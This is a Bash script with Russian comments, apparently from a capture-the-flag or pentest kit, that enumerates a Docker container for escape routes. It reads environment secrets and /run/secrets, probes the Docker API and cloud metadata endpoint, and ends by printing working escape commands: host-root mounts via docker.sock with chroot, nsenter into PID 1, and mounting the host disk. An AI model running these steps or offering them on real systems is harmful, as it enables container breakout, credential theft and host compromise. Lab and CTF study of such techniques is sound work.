#!/usr/bin/env bash
# docker_audit.sh — аудит контейнера/Docker-хоста. Только чтение.
#
#   bash docker_audit.sh | tee docker.txt
#
# Дальше — linux/DOCKER.md: там команды побега/повышения прав.
set -u

echo "===== 1. Я в контейнере? ====="
ls -la /.dockerenv 2>/dev/null || echo "нет /.dockerenv"
cat /proc/1/cgroup 2>/dev/null | head -10
hostname
cat /etc/hostname 2>/dev/null

echo
echo "===== 2. Capabilities ====="
capsh --print 2>/dev/null || true
grep -E '^Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status 2>/dev/null || true
getpcaps $$ 2>/dev/null || true

echo
echo "===== 3. Docker socket ====="
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null || echo "сокета нет"
if [ -S /var/run/docker.sock ] || [ -S /run/docker.sock ]; then
  SOCK=/var/run/docker.sock
  [ -S "$SOCK" ] || SOCK=/run/docker.sock
  echo "--- docker ps ---"
  docker -H "unix://$SOCK" ps 2>&1 | head -20 || true
  echo "--- docker images ---"
  docker -H "unix://$SOCK" images 2>&1 | head -20 || true
  echo "[i] побег: docker -H unix://$SOCK run -it -v /:/host alpine chroot /host sh"
fi

echo
echo "===== 4. Монтирования и host-пути ====="
mount 2>/dev/null | head -40
findmnt -R / 2>/dev/null | head -40 || true
ls -la /host /mnt/host /rootfs /media 2>/dev/null || true

echo
echo "===== 5. cgroups ====="
cat /proc/1/cgroup 2>/dev/null
ls -la /sys/fs/cgroup 2>/dev/null | head -30
echo "[i] cgroup v1 release_agent: см. linux/DOCKER.md"

echo
echo "===== 6. PID namespace / процессы ====="
cat /proc/1/comm 2>/dev/null
ls /proc 2>/dev/null | grep -E '^[0-9]+$' | wc -l
ps aux 2>/dev/null | head -30 || true

echo
echo "===== 7. Устройства ====="
ls -la /dev 2>/dev/null | head -30

echo
echo "===== 8. Секреты в окружении ====="
env 2>/dev/null | grep -Ei 'pass|secret|token|key|aws|flag|docker' || true
ls -la /run/secrets 2>/dev/null || true
cat /run/secrets/* 2>/dev/null | head -20 || true

echo
echo "===== 9. Kubernetes ====="
ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null || echo "не k8s"

echo
echo "===== 10. Docker API на localhost ====="
(ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null) | grep -E '2375|2376' || true
timeout 2 curl -s http://127.0.0.1:2375/version 2>/dev/null | head -5 || true

echo
echo "===== 11. Облачные метаданные (если есть) ====="
timeout 2 curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || true

echo
echo "===== 12. Что дальше ====="
echo "  privileged?      mount /dev/sda1 /mnt; cat /mnt/root/flag"
echo "  host PID?        nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
echo "  docker.sock?     docker run -it -v /:/host alpine chroot /host bash"
echo "  cap_sys_admin?   см. release_agent/core_pattern в linux/DOCKER.md"
echo "  образ?           python forensic/docker_image.py image.tar"
